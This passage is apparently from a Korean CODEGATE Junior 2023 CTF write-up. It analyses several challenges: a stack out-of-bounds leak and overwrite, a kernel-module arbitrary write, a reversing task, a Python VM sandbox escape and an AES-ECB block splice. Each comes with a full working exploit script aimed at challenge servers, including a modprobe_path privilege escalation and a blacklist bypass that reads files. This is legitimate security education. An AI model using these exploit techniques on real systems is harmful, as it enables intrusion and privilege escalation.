        break;
    }
  }
  while ( v5 != 5 );
  return 0LL;
}
```
랜덤한 이름으로 초기화된다.
```c
unsigned __int64 __fastcall sub_172A(__int64 a1)
{
  unsigned int v2; // [rsp+18h] [rbp-58h]
  int v3; // [rsp+1Ch] [rbp-54h]
  char buf[72]; // [rsp+20h] [rbp-50h] BYREF
  unsigned __int64 v5; // [rsp+68h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  printf("Index: ");
  __isoc99_scanf("%d", v2);
  if ( v2 >= cnt )
  {
    puts("Index must be less than the number of books.");
  }
  else
  {
    v3 = read(0, buf, 0x3FuLL);
    if ( buf[v3 - 1] == '\n' )
      buf[v3 - 1] = 0;
    memcpy((void *)(((unsigned __int64)v2 << 7) + a1 + 0x40), buf, v3);
  }
  return v5 - __readfsqword(0x28u);
}
```
case3에서 scanf %d, v2로 받는데, v2가 unsigned int이고 포인터가 아니라 무조건 터진다.
사실상 없는 기능이다.
```c
unsigned __int64 __fastcall add(__int64 a1)
{
  int v2; // [rsp+1Ch] [rbp-54h]
  char buf[72]; // [rsp+20h] [rbp-50h] BYREF
  unsigned __int64 v4; // [rsp+68h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  printf("Book title: ");
  v2 = read(0, buf, 0x3FuLL);
  if ( buf[v2 - 1] == 10 )
    buf[v2 - 1] = 0;
  memcpy((void *)(((unsigned __int64)(unsigned int)cnt << 7) + a1), buf, v2);
  ++cnt;
  return v4 - __readfsqword(0x28u);
}
```
여기서 case2에서 입력받고, 추가한다.
그리고 sort 함수를 호출한다.
```c
  v4 = cnt - 2;
  while ( v4 >= 0 )
  {
    if ( strcmp((const char *)(((v4 + 1LL) << 7) + a1), (const char *)(((__int64)v4 << 7) + a1)) >= 0 || v4 == cnt )
    {
      --v4;
    }
    else                                        // swap
    {
      v1 = (__int64 *)(((__int64)v4 << 7) + a1);
      v5 = *v1;
      v6 = v1[1];
      v7 = v1[2];
      v8 = v1[3];
      v9 = v1[4];
      v10 = v1[5];
      v11 = v1[6];
      v12 = v1[7];
      v13 = v1[8];
      v14 = v1[9];
      v15 = v1[10];
      v16 = v1[11];
      v17 = v1[12];
      v18 = v1[13];
      v19 = v1[14];
      v20 = v1[15];
      memcpy(v1, (const void *)(((v4 + 1LL) << 7) + a1), 0x40uLL);// if s[0] < s[1] -> s[0] = s[1]
      memcpy((void *)(((__int64)v4 << 7) + a1 + 0x40), (const void *)(((v4 + 1LL) << 7) + a1 + 64), 0x40uLL);
      v2 = (_QWORD *)(((v4 + 1LL) << 7) + a1);
      *v2 = v5;                                 // s[1] = s[0]
      v2[1] = v6;
      v2[2] = v7;
      v2[3] = v8;
      v2[4] = v9;
      v2[5] = v10;
      v2[6] = v11;
      v2[7] = v12;
      v2 += 8;
      *v2 = v13;
      v2[1] = v14;
      v2[2] = v15;
      v2[3] = v16;
      v2[4] = v17;
      v2[5] = v18;
      v2[6] = v19;
      v2[7] = v20;
      ++v4;
    }
  }
  return v21 - __readfsqword(0x28u);
}
```
버블 소트 비스무리하게 생겼다.
문자열 크기가 큰 순서대로 뒤로간다.

## Exploitation
`strcmp((const char *)(((v4 + 1LL) << 7) + a1), (const char *)(((__int64)v4 << 7) + a1)) >= 0 || v4 == cnt` 조건을 만족하지 않으면 swap하고 v4++가 된다.
`v4 == cnt-1`로 수정되어야한다.
v4에 대한 경계 체크가 미흡해서 sfp, ret, canary 릭이 가능하고, 크기를 잘 맞추면 덮는 것도 가능하다.

### Exploit script
```python
from pwn import *

DEBUG = False

context.terminal=['tmux', 'splitw', '-h']
context.binary = e = ELF('./librarian')
libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')

off = [0x0175D,] # 0x13F4,0x0151D,0x0156B
script = ''
for i in off:
    script += f'brva {hex(i)}\n'

if DEBUG:
    p = gdb.debug(e.path,env={"LD_PRELOAD":"./libc.so.6"}, gdbscript=script)
else :
    #p = process(e.path,env={"LD_PRELOAD":"./libc.so.6"})
    p = remote('43.201.16.196',8888)
sla = lambda x,y : p.sendlineafter(x,y)
sa = lambda x,y : p.sendafter(x,y)

def add_book(x):
    sla(b'choice: ',b'2')
    sa(b'Book title: ',x)
sla(b'choice: ',b'4')
for i in range(14):
    add_book(b'A'*(0x30+i+1))
add_book(b'A'*(0x1))
sla(b'choice: ',b'1')
p.recvuntil(b'1. ')
p.recv(8)
canary = u64(p.recv(8))
p.recv(8)
libc_base = u64(p.recv(8)) - 0x23510
success("libc_base : " + hex(libc_base))
stack = u64(p.recv(8))
success("stack : " + hex(stack))
success("canary : " + hex(canary))
sla(b'choice: ',b'4')
for i in range(13):
    add_book(b'B'*(0x30+i+1))
pay = b'\xff'*0x8 + p64(canary)
pay += p64(0)
pay += p64(libc_base + 0x4e1d0)
pay +=  b'\xff'*(0x30+14- len(pay))
add_book(pay)
add_book(b'B'*(0x1))
sla('choice:',b'5')

p.interactive()

```
`codegate2023{dceb0dcf4aed699a87d1f831f5ff5d5402135fcd211f4bbffab699915b9c78a0de98b6d5b53aaf3c19b8673805de1c8b0325c4c4cd18bc72fe73610f}`

# HM
## Analysis
```c
__int64 __fastcall m_ioctl(__int64 a1, __int64 a2)
{
  __int64 args; // rdx
  __int64 result; // rax

  _fentry__(a1, a2);
  copy_from_user(&user_input, args, 0x10LL);
  result = 0LL;
  if ( (_DWORD)a2 == 0x1337 )                   // 0x1337
  {
    copy_from_user(user_input, *(&user_input + 1), 0xCLL);
    return 1LL;
  }
  return result;
}
```
AAW를 준다.

```
#!/bin/sh

/bin/busybox --install -s

stty raw -echo

chown -R 0:0 /

mkdir -p /proc && mount -t proc none /proc
mkdir -p /dev  && mount -t devtmpfs devtmpfs /dev
mkdir -p /tmp  && mount -t tmpfs tmpfs /tmp

echo 0 > /proc/sys/kernel/kptr_restrict
echo 0 > /proc/sys/kernel/perf_event_paranoid
echo 1 > d

chmod 444 /proc/kallsyms
chmod 400 /flag

insmod /hm.ko
chmod 666 /dev/hm

mv /exploit /tmp/exploit

chown -R 1000:1000 /tmp

setsid /bin/cttyhack setuidgid 1000 /bin/sh

umount /proc
poweroff -d 1 -n -f
```
rootfs/etc/init.d/rcS를 보면 위와 같다.
kadr이 비활성화되어있다.

## Exploitation
KADR 안걸려있으니 릭하고 modprobe_path 덮었다.
### Exploit script
```c
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <sys/ioctl.h>
#include <stdint.h>
#include <sys/wait.h>

struct info {
    uint64_t dst; // must be kernel space
    uint8_t * src;
};
void shell(void){
    system("echo '#!/bin/sh\nchmod 777 /flag' > /tmp/x");
    system("chmod +x /tmp/x");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/v");
    system("chmod +x /tmp/v");
    system("/tmp/v");

    system("cat /flag");
    exit(0);
}
int main(){
    int fd = open("/dev/hm",O_RDONLY);
    if (fd == -1)
        exit(-1);
    struct info io;
    system("cat /proc/kallsyms | grep modprobe_path");
    uint64_t modprobe_path;
    puts("> ");
    scanf("%lx",&modprobe_path);
    printf("modprobe_path : %lx",modprobe_path);

    io.dst = modprobe_path;
    io.src = malloc(0x20);
    strcpy(io.src,"/tmp/x\x00");
    ioctl(fd, 0x1337, &io);
    shell();
    close(fd);
    return 0;
}
```
`codegate2023{cOnGrAtUlAtIoNs_!_HoPe_1t_wAs_a_FuN_cHaLl}`


# EasyReversing
## Analysis
```c
void __noreturn sub_7FF7E1AA2030()
{
  char *v0; // rdi
  __int64 i; // rcx
  char v2[280]; // [rsp+20h] [rbp+0h] BYREF

  v0 = v2;
  for ( i = 26i64; i; --i )
  {
    *(_DWORD *)v0 = -858993460;
    v0 += 4;
  }
  sub_7FF7E1AA13A2(byte_7FF7E1AB20A3);
  memset(&v2[16], 0, 0x40ui64);
  SetUnhandledExceptionFilter(TopLevelExceptionFilter);
  __debugbreak();
}
```
메인 로직 잘 찾아서 확인했더니 슈도코드가 짤려있다.
```c
.text:00007FF7E1AA2030 ; __unwind { // j___GSHandlerCheck
.text:00007FF7E1AA2030                 push    rbp
.text:00007FF7E1AA2032                 push    rdi
.text:00007FF7E1AA2033                 sub     rsp, 148h
.text:00007FF7E1AA203A                 lea     rbp, [rsp+20h]
.text:00007FF7E1AA203F                 lea     rdi, [rsp+150h+var_130]
.text:00007FF7E1AA2044                 mov     ecx, 1Ah
.text:00007FF7E1AA2049                 mov     eax, 0CCCCCCCCh
.text:00007FF7E1AA204E                 rep stosd
.text:00007FF7E1AA2050                 mov     rax, cs:__security_cookie
.text:00007FF7E1AA2057                 xor     rax, rbp
.text:00007FF7E1AA205A                 mov     [rbp+130h+var_18], rax
.text:00007FF7E1AA2061                 lea     rcx, byte_7FF7E1AB20A3
.text:00007FF7E1AA2068                 call    sub_7FF7E1AA13A2
.text:00007FF7E1AA206D                 lea     rax, [rbp+130h+Buf1]
.text:00007FF7E1AA2071                 mov     rdi, rax
.text:00007FF7E1AA2074                 xor     eax, eax
.text:00007FF7E1AA2076                 mov     ecx, 40h ; '@'
.text:00007FF7E1AA207B                 rep stosb
.text:00007FF7E1AA207D                 lea     rcx, TopLevelExceptionFilter ; lpTopLevelExceptionFilter
.text:00007FF7E1AA2084                 call    cs:SetUnhandledExceptionFilter
.text:00007FF7E1AA208A                 int     3               ; Trap to Debugger
.text:00007FF7E1AA208B ; ---------------------------------------------------------------------------
.text:00007FF7E1AA208B                 lea     rcx, aInput     ; "INPUT: "
.text:00007FF7E1AA2092                 call    sub_7FF7E1AA11A9
.text:00007FF7E1AA2097                 mov     r8d, 40h ; '@'
.text:00007FF7E1AA209D                 lea     rdx, [rbp+130h+Buf1]
.text:00007FF7E1AA20A1                 lea     rcx, Format     ; "%s"
.text:00007FF7E1AA20A8                 call    scanf
.text:00007FF7E1AA20AD                 lea     rcx, [rbp+130h+Buf1]
.text:00007FF7E1AA20B1                 call    stage_1
.text:00007FF7E1AA20B6                 lea     rcx, [rbp+130h+Buf1]
.text:00007FF7E1AA20BA                 call    stage_2
.text:00007FF7E1AA20BF                 lea     rcx, [rbp+130h+Buf1]
.text:00007FF7E1AA20C3                 call    stage_3
.text:00007FF7E1AA20C8                 lea     rcx, [rbp+130h+Buf1]
.text:00007FF7E1AA20CC                 call    stage_4
.text:00007FF7E1AA20D1                 mov     r8d, 40h ; '@'  ; Size
.text:00007FF7E1AA20D7                 lea     rdx, unk_7FF7E1AAD280 ; Buf2
.text:00007FF7E1AA20DE                 lea     rcx, [rbp+130h+Buf1] ; Buf1
.text:00007FF7E1AA20E2                 call    j_memcmp
.text:00007FF7E1AA20E7                 test    eax, eax
.text:00007FF7E1AA20E9                 jnz     short loc_7FF7E1AA20F9
.text:00007FF7E1AA20EB                 lea     rcx, aCorrect   ; "Correct!\n"
.text:00007FF7E1AA20F2                 call    sub_7FF7E1AA11A9
.text:00007FF7E1AA20F7                 jmp     short loc_7FF7E1AA2105
.text:00007FF7E1AA20F9 ; ---------------------------------------------------------------------------
.text:00007FF7E1AA20F9
.text:00007FF7E1AA20F9 loc_7FF7E1AA20F9:                       ; CODE XREF: sub_7FF7E1AA2030+B9↑j
.text:00007FF7E1AA20F9                 lea     rcx, aNope      ; "Nope...\n"
.text:00007FF7E1AA2100                 call    sub_7FF7E1AA11A9
.text:00007FF7E1AA2105
.text:00007FF7E1AA2105 loc_7FF7E1AA2105:                       ; CODE XREF: sub_7FF7E1AA2030+C7↑j
.text:00007FF7E1AA2105                 call    cs:getchar
.text:00007FF7E1AA210B                 xor     eax, eax
.text:00007FF7E1AA210D                 mov     edi, eax
.text:00007FF7E1AA210F                 lea     rcx, [rbp+130h+var_150]
.text:00007FF7E1AA2113                 lea     rdx, unk_7FF7E1AAAD00
.text:00007FF7E1AA211A                 call    sub_7FF7E1AA133E
.text:00007FF7E1AA211F                 mov     eax, edi
.text:00007FF7E1AA2121                 mov     rcx, [rbp+130h+var_18]
.text:00007FF7E1AA2128                 xor     rcx, rbp        ; StackCookie
.text:00007FF7E1AA212B                 call    j___security_check_cookie
.text:00007FF7E1AA2130                 lea     rsp, [rbp+128h]
.text:00007FF7E1AA2137                 pop     rdi
.text:00007FF7E1AA2138                 pop     rbp
.text:00007FF7E1AA2139                 retn
.text:00007FF7E1AA2139 ; } // starts at 7FF7E1AA2030
.text:00007FF7E1AA2139 sub_7FF7E1AA2030 endp
.text:00007FF7E1AA2139
.text:00007FF7E1AA2139 ; --------------------------------------
```
 SetUnhandledExceptionFilter에서 디버거가 없을때 실행되는 TopLevelExceptionFilter 콜백 함수를 등록했다. 
```c
__int64 __fastcall sub_7FF7E1AA1830(_EXCEPTION_POINTERS *a1)
{
  DWORD64 v2; // [rsp+68h] [rbp+48h]
  __int64 v3; // [rsp+68h] [rbp+48h]
  int n; // [rsp+84h] [rbp+64h]
  int j; // [rsp+84h] [rbp+64h]
  int k; // [rsp+84h] [rbp+64h]
  int m; // [rsp+84h] [rbp+64h]
  int ii; // [rsp+84h] [rbp+64h]
  int i; // [rsp+A4h] [rbp+84h]

  sub_7FF7E1AA13A2(byte_7FF7E1AB20A3);
  if ( a1->ExceptionRecord->ExceptionCode == 0x80000003 )
  {
    ++a1->ContextRecord->Rip;
    a1->ContextRecord->Dr0 = (DWORD64)stage_1;
    a1->ContextRecord->Dr1 = (DWORD64)stage_2;
    a1->ContextRecord->Dr2 = (DWORD64)stage_3;
    a1->ContextRecord->Dr3 = (DWORD64)stage_4;
    a1->ContextRecord->Dr7 |= 0x44ui64;
    return 0xFFFFFFFFi64;
  }
  else if ( a1->ExceptionRecord->ExceptionCode == 0x80000004 )
  {
    v2 = a1->ContextRecord->Dr6 & 0xF;
    if ( v2 )
    {
      for ( i = 0; i < 4 && (v2 & 1) != 1; ++i )
        v2 >>= 1;
      if ( i )
      {
        switch ( i )
        {
          case 1:
            for ( j = 0; j < 256; ++j )
              sbox[j] += 0x15;
            break;
          case 2:
            for ( k = 0; k < 256; ++k )
              sbox_2[k] -= 0x3C;
            break;
          case 3:
            for ( m = 0; m < 64; ++m )
              table_2[m] ^= 0x9Fu;
            break;
        }
      }
      else
      {
        for ( n = 0; n < 64; ++n )
          table_1[n] ^= 5u;
      }
      v3 = 1i64;
      for ( ii = 0; ii < i; ++ii )
        v3 *= 4i64;
      a1->ContextRecord->Dr7 &= ~v3;
      return 0xFFFFFFFFi64;
    }
    else
    {
      return 0i64;
    }
  }
  else
  {
    return 0i64;
  }
}
```
\_EXCEPTION_POINTERS 구조체 포인터가 인자로 넘겨진다.
처음에 int3로 트랩이 걸리면 Dr0~Dr3에 함수 주소를 넣는다.
![](/blog/CODEGATE_Junior_2023_Quals/image-2.png)
Dr7에 0x44가 들어간다.
Dr1, Dr3 부분만 걸리니 그 부분만 따로 연산을 진행하면 실제 테이블 값을 얻을 수 있다.

stage1, stage2, stage3, stage4는 단순 xor 이거나 치환이다.

## Exploitation
미리 테이블 구해놓고 단순 역연산을 하면 된다.
### Exploit script
```python

table_1 = [120, 80, 27, 214, 131, 229, 135, 253, 203, 159, 151, 227, 55, 141, 240, 184, 235, 187, 212, 63, 180, 251, 193, 14, 10, 170, 92, 5, 134, 39, 138, 77, 70, 81, 110, 145, 93, 126, 205, 207, 118, 8, 92, 170, 220, 226, 81, 220, 2, 139, 7, 84, 128, 80, 136, 195, 178, 207, 144, 99, 25, 181, 185, 19]
sbox = [45, 134, 204, 241, 109, 236, 18, 228, 50, 129, 87, 218, 132, 225, 250, 127, 28, 101, 233, 95, 170, 142, 121, 32, 51, 242, 110, 76, 253, 111, 208, 58, 10, 115, 116, 12, 92, 209, 182, 65, 207, 234, 146, 222, 240, 198, 2, 94, 147, 98, 30, 212, 86, 246, 206, 171, 55, 9, 164, 112, 158, 252, 192, 174, 145, 3, 96, 74, 82, 202, 5, 189, 103, 201, 78, 93, 53, 25, 200, 186, 173, 196, 43, 91, 89, 235, 194, 133, 23, 83, 213, 190, 150, 118, 36, 72, 149, 124, 154, 249, 245, 197, 168, 232, 238, 226, 29, 33, 137, 148, 126, 243, 223, 52, 90, 239, 193, 31, 40, 77, 187, 81, 73, 156, 136, 66, 237, 37, 14, 62, 16, 165, 169, 113, 152, 140, 251, 24, 139, 49, 57, 214, 248, 107, 38, 227, 56, 184, 61, 177, 20, 63, 125, 70, 255, 120, 178, 99, 195, 153, 162, 130, 13, 46, 7, 224, 181, 185, 54, 203, 88, 114, 26, 106, 220, 8, 210, 144, 27, 188, 199, 161, 39, 219, 48, 11, 143, 68, 1, 216, 15, 167, 67, 176, 183, 59, 21, 254, 104, 4, 97, 151, 119, 157, 122, 102, 215, 179, 180, 217, 117, 42, 135, 60, 163, 35, 160, 128, 229, 131, 244, 80, 22, 79, 47, 0, 100, 105, 231, 141, 19, 17, 41, 191, 221, 230, 155, 175, 211, 166, 69, 172, 108, 84, 64, 138, 44, 34, 85, 6, 75, 123, 159, 205, 247, 71]
rev_sbox=[0 for _ in range(256)]
sbox_2 = [4, 247, 89, 2, 96, 133, 175, 151, 56, 188, 212, 36, 28, 187, 208, 152, 172, 48, 37, 174, 130, 239, 191, 10, 92, 207, 88, 126, 131, 132, 71, 63, 39, 149, 43, 186, 235, 251, 69, 94, 103, 34, 134, 155, 1, 228, 17, 183, 97, 199, 157, 236, 62, 41, 164, 185, 25, 168, 234, 227, 206, 82, 177, 125, 169, 33, 195, 160, 20, 16, 79, 237, 52, 32, 167, 47, 217, 60, 50, 211, 121, 122, 205, 45, 173, 54, 198, 9, 68, 38, 105, 176, 19, 53, 250, 98, 119, 110, 153, 229, 159, 158, 170, 184, 107, 115, 179, 156, 166, 111, 87, 216, 161, 127, 73, 221, 109, 67, 194, 147, 61, 233, 108, 128, 11, 59, 145, 214, 255, 162, 46, 14, 180, 21, 242, 193, 139, 101, 120, 165, 238, 146, 24, 154, 118, 196, 99, 232, 55, 150, 249, 124, 142, 230, 113, 95, 163, 141, 70, 253, 13, 231, 243, 213, 210, 104, 49, 26, 102, 224, 31, 117, 76, 204, 140, 51, 136, 77, 245, 5, 80, 85, 200, 241, 44, 81, 226, 219, 181, 190, 74, 100, 192, 209, 178, 90, 22, 137, 3, 222, 66, 15, 86, 84, 148, 114, 12, 29, 123, 143, 244, 112, 201, 203, 64, 23, 40, 93, 129, 254, 246, 135, 27, 58, 171, 225, 57, 7, 144, 18, 220, 65, 75, 240, 30, 0, 42, 35, 138, 197, 218, 215, 8, 182, 72, 106, 252, 6, 78, 91, 223, 83, 116, 189, 248, 202]
rev_sbox_2=[0 for _ in range(256)]
table_2 = [163, 242, 234, 9, 129, 221, 211, 62, 14, 202, 9, 40, 252, 60, 48, 0, 99, 228, 26, 236, 215, 118, 141, 8, 215, 8, 61, 141, 113, 180, 159, 165, 10, 172, 196, 78, 8, 152, 251, 55, 157, 39, 242, 188, 68, 221, 164, 154, 24, 42, 43, 119, 3, 167, 134, 102, 159, 214, 96, 33, 158, 134, 218, 141]

def rev_stage_1(x):
    for i in range(64):
        x[i] ^= table_1[i]
def rev_stage_2(x):
    for i in range(64):
        x[i] = rev_sbox[x[i]]
def rev_stage_3(x): 
    for i in range(64):
        x[i] = rev_sbox_2[x[i]]
def rev_stage_4(x):
    for i in range(64):
        x[i] ^= table_2[i]
            
def Exception(f):
    global table_1, table_2, sbox,sbox_2
    i = 0
    if f&0xf:
        while True:
            if (f & 1) != 1:
                f>>=1
                i+=1
            else:
                break
        if i==0:
            for i in range(64):
                table_1[i] ^= 5
        elif i ==1 :
            for i in range(256):
                sbox[i] += 0x15
                sbox[i] &= 0xff
        elif i ==2 :
            for i in range(256):
                sbox_2[i] -= 0x3c
                sbox_2[i] &= 0xff
        elif i == 3:
            for i in range(64):
                table_2[i] ^= 0x9f

cmp = [82, 55, 159, 25, 106, 8, 63, 194, 239, 209, 252, 184, 196, 232, 214, 4, 71, 159, 226, 6, 72, 105, 239, 51, 145, 73, 160, 54, 154, 51, 210, 144, 170, 23, 254, 113, 51, 243, 211, 17, 186, 97, 60, 30, 144, 206, 102, 96, 215, 139, 202, 135, 197, 239, 75, 201, 167, 218, 23, 131, 68, 80, 177, 4]
# Exception(1<<0)
Exception(1<<1)
# Exception(1<<2)
Exception(1<<3)
for i in range(256):
    rev_sbox_2[sbox_2[i]] = i
    rev_sbox[sbox[i]] = i
rev_stage_4(cmp)
rev_stage_3(cmp)
rev_stage_2(cmp)
rev_stage_1(cmp)

print(cmp)
for i in cmp:
    print(chr(i),end='')
```
`codegate2023{c3fe22c964e2640b104fd3269a820f72}`

# vspace
## Analysis
```python
from EngineStruct import Instruction
from Engine import VMEngine

import json
import base64
import binascii
import sys
import signal

def timeout_handler(signum, frame):
    print("time out.")
    raise SystemExit()

# very very very very very very very very very very easy code virutalization teq 
def main():
    code = input("Input code:")
    try:
        decode_data = base64.b64decode(code)
    except binascii.Error:
        print("[!] base64 decode error!")
        sys.exit(0)

    try:
        json_insns = json.loads(decode_data)
    except json.decoder.JSONDecodeError:
        print("[!] json decode error!")
        sys.exit(0)
    
    vme = VMEngine()
    vme.set_black_list(["flag"])
    vme.set_file_options(["exists"])

    instructions = vme.parse_json(json_insns)
    print("[*] Init instructions ....")
    print("[+] Execute IL!")
    print("----------------------------------")
    vme.run(instructions)
    print("----------------------------------")

if __name__ == "__main__":
    timeout_seconds = 3
    signal.signal(signal.SIGALRM, timeout_handler)
    signal.alarm(timeout_seconds)
    main()
```
```python
from EngineStruct import Stack, Instruction
import pathlib
import types
import time

class VMEngine:
    def __init__(self):
        self.pc = 0
        self.stack = Stack()
        self.values = {}
        self.set_black_list([])
        self.set_file_options(["read_text", "exists", "glob", "is_dir", "read_bytes", "mkdir", "write_bytes", "write_text", "is_dir", "is_file"])

    def set_black_list(self, blacklist):
        self.values["blacklist"] = blacklist
    
    def get_black_list(self):
        return self.values["blacklist"]
    
    def set_file_options(self, options):
        self.values["file_options"] = options
    
    def get_file_options(self):
        return self.values["file_options"]

    def run(self, instructions):
        while True:
            if self.pc >= len(instructions):
                break
            
            insn = instructions[self.pc]

            match insn.opcode:
                case "😀":
                    self.stack.push(insn.opnd[0])

                case "😄":
                    operand1 = self.stack.pop()
                    operand2 = self.stack.pop()
                    if type(operand1) != int or type(operand2) != int:
                        print("Operand type error!")
                        break
                    self.stack.push(operand1 + operand2)

                case "😁":
                    operand1 = self.stack.pop()
                    operand2 = self.stack.pop()
                    if type(operand1) != int or type(operand2) != int:
                        print("Operand type error!")
                        break
                    self.stack.push(operand1 - operand2)

                case "😆":
                    operand1 = self.stack.pop()
                    operand2 = self.stack.pop()
                    if type(operand1) != int or type(operand2) != int:
                        print("Operand type error!")
                        break
                    self.stack.push(operand1 * operand2)

                case "🥹":
                    operand1 = self.stack.pop()
                    operand2 = self.stack.pop()
                    if type(operand1) != int or type(operand2) != int:
                        print("Operand type error!")
                        break
                    self.stack.push(operand1 / operand2)

                case "😂":
                    operand1 = insn.opnd[0]
                    value = self.stack.pop()

                    if type(operand1) != str:
                        print("Operand type error!")
                        break

                    self.values[operand1] = value

                case "😅":
                    operand1 = insn.opnd[0]
                    if type(operand1) != str:
                        print("Operand type error!")
                        break

                    try:    
                        value = self.values[operand1]
                        self.stack.push(value)

                    except KeyError:
                        print("Values key error!")
                        break

                case "🤣":
                    key = insn.opnd[0]
                    operand1 = self.stack.pop()
                    operand2 = self.stack.pop()
                    if type(operand1) != type(operand2):
                        print("Operand type error!")
                        break
                    
                    self.values[key] = operand1 == operand2
                    
                case "🥲":
                    index = insn.opnd[0]
                    if type(index) != int:
                        print("Operand type error!")
                        break
                    
                    self.pc += index
                    continue

                case "😍":
                    index = insn.opnd[1]
                    key = insn.opnd[0]

                    if type(index) != int or type(key) != str:
                        print("Operand type error!")
                        break
                    try:
                        result = self.values[key]
                    except KeyError:
                        print("Values key error!")
                        break 
                
                    if result:
                        self.pc += index
                    else:
                        self.pc += 1
                    continue

                case "🥰":
                    index = insn.opnd[1]
                    key = insn.opnd[0]

                    if type(index) != int or type(key) != str:
                        print("Operand type error!")
                        break
                    
                    try:
                        result = self.values[key]
                    except KeyError:
                        print("Values key error!")
                        break 
                
                    if not result:
                        self.pc += index
                    else:
                        self.pc += 1
                    continue
                
                case "✓":
                    print(self.stack.pop())
                
                case "⭐️":
                    data1 = self.stack.pop()
                    data2 = self.stack.pop()
                    if type(data1) != str or type(data2) != str:
                        print("Operand type error!")
                        break
                    self.stack.push(data1 + data2)

                case "♥️":
                    data = self.stack.pop()
                    index = self.stack.pop()
                    if type(data) != str or type(index) != int:
                        print("Operand type error!")
                        break
                    try:
                        self.stack.push(data[index])
                    except IndexError:
                        print("Out of index error!")
                        break
                
                case "➖":
                    char = self.stack.pop()
                    if type(data) != str and len(data) != 1:
                        print("Operand type error!")
                        break
                    self.stack.push(len(char))

                case "🐸":
                    print("Exit!")
                    break

                case "🧠":
                    filename = self.stack.pop()
                    index = self.stack.pop()
                    if type(filename) != str:
                        print("Operand type error!")
                        break
                    
                    _path = pathlib.Path(filename)
                    
                    if _path.name in self.get_black_list():
                        print("Blacklist error!")
                        break
                    
                    options = self.get_file_options()                        
                    try:
                        result = _path.__getattribute__(options[index])(*insn.opnd)
                        if types.GeneratorType == type(result):
                            self.stack.push(list(result))
                        else:
                            self.stack.push(result)
                    except IndexError:
                        print("Out of range!")
                        break

                case "🗣️":
                    sleep_time = self.stack.pop()
                    if type(sleep_time) != int:
                        print("Operand type error!")
                        break 
                    time.sleep(sleep_time)

                case _:
                    print("Wtf?")
                    break

            self.pc += 1


    def parse_json(self, insntructions:list):
        result = []
        for insn in insntructions:
            result.append(Instruction(insn["opcode"], insn["operands"]))
        return result
```
단순 VM이다.
여러 명령어들이 지원된다.
기본적으로 exists 같은 기능만 지원되고 블랙리스트도 걸려있다.

## Exploitation
딕셔너리 키 검증이 없고 따로 제한이 있는 것도 아니라서 마음대로 파일 읽거나 확인이 가능하다.

### Exploit script
```python
import json
import base64
from pwn import *
IL = []

def gen_IL(opcode,operands=[]):
    global IL
    IL.append({"opcode":opcode, "operands":operands})
def payload(x):
    json_string = json.dumps(x)
    return (base64.b64encode(json_string.encode('utf-8')))

push = "😀"
add = "😄" 
sub = "😁" 
mul = "😆"
div = "🥹"
reg_v = "😂" # values[opnd[0]] = value
push_reg = "😅" # push self.values[opnd[0]]
cmpeq = "🤣" # self.values[opnd[0]] = operand1 == operand2
jmp = "🥲"
cont_jmp = "😍" # if self.values[opnd[0]] -> jmp opnd[1]
conf_jmp = "🥰" # if not self.values[opnd[0]] -> jmp opnd[1]
dump_stack = "✓" # print(self.stack.pop())
str_concat = "⭐️"
str_index = "♥️" # string[index]
strlen = "➖" # push(len(char))
done = "🐸"
readfile = "🧠" # filename, index
sleep_time = "🗣️"

def push_string(x):
    x = x[::-1]
    gen_IL(push,x[0])
    for i in range(len(x)-1):
        gen_IL(push,x[i+1])
        gen_IL(str_concat)


gen_IL(push,[["NOOOO"]])
gen_IL(reg_v,["blacklist"])
gen_IL(push_reg,["blacklist"])
gen_IL(dump_stack)

gen_IL(push,[["read_text", "exists", "glob", "is_dir", "read_bytes", "mkdir", "write_bytes", "write_text", "is_dir", "is_file",'cwd']])
gen_IL(reg_v,["file_options"])

gen_IL(push_reg,["file_options"])
gen_IL(dump_stack)

gen_IL(push,[0])
push_string("/home/ctf/codegate2023-read-plz") # /etc/passwd
gen_IL(readfile)
gen_IL(dump_stack)

# gen_IL(push,[2])
# push_string("/home/ctf")
# gen_IL(readfile,['**/*'])
# gen_IL(dump_stack)

p = remote("43.202.60.58",5333)
p.sendline(payload(IL))
p.interactive()
# gen_IL(push,"read_text")
# gen_IL(reg_v,["file_options"])
```
`codegate2023{ab364274a7507b29b525cf4f1a00d71ec2d9bc278aad2d81fcddaf2710a6c52ee079cb6823860d9ea210bfc9e10b3a}`
# CryptoGenius
```python
#!/usr/bin/python3
from hashlib import md5
from Crypto.Cipher import AES
from base64 import *
from secret import secret_key,flag

BS = 16
KEY = secret_key
FLAG = flag

pad = lambda s: s + (BS - len(s) % BS) * \
                chr(BS - len(s) % BS)
unpad = lambda s: s[:-ord(s[len(s) - 1:])]

def encrypt(raw):
    raw = pad(raw)
    cipher = AES.new(KEY, AES.MODE_ECB)
    return b64encode(cipher.encrypt(raw.encode('utf8')))

def decrypt(enc):
    enc = b64decode(enc)
    cipher = AES.new(KEY, AES.MODE_ECB)
    return unpad(cipher.decrypt(enc)).decode('utf8')

def main():
    while True:
        print ("""
========= Your Behavior =========
1. EXPERIMENT
2. SUBMIT
3. CLOSE
""")
        behavior = int(input("your behavior > "))
        if behavior == 1:
            print ("I'm a crypto genius")    
            input_data = input("Do you want to experiment? > ")

            if len(input_data) > 20:
                print ("It's still too much...")
            else:
                enc = encrypt(input_data)
                print (enc)

        elif behavior == 2:
            input_data = input ("Did you already solve the trick? > ")
            try:
                dec = decrypt(input_data)
                if len(dec) == 128 and dec == "6230ee81ac9d7785a16c75b93a89de9cbb9cbb2ddabaaadd035378c36a44eeacb371322575b467a4a3382e3085da281731557dadd5210f21b75e1e9b7e426eb7":
                    print (f"flag : {FLAG}")
                else:
                    print ("you're still far away")
            except:
                print ("you're still far away")
                continue


        elif behavior == 3:
            print ("BYE ... ")
            break
        else:
            print("[*] Invalid input")

if __name__ == '__main__':
    main ()
```
## Exploitation
MODE_ECB라서 블록간에 간섭이 없다.
16바이트씩 자르고, 다시 붙이면 된다.
### Exploit script
```python
from pwn import *
from base64 import *

p = remote('13.124.113.252', 12345)

t = "6230ee81ac9d7785a16c75b93a89de9cbb9cbb2ddabaaadd035378c36a44eeacb371322575b467a4a3382e3085da281731557dadd5210f21b75e1e9b7e426eb7"
l = []
for i in range(0, len(t), 16):
    l.append(t[i:i+16])
enc = []
for i in range(len(l)):
    p.sendlineafter(b'> ',b'1')
    p.sendlineafter(b'> ',l[i])
    res = p.recvline()
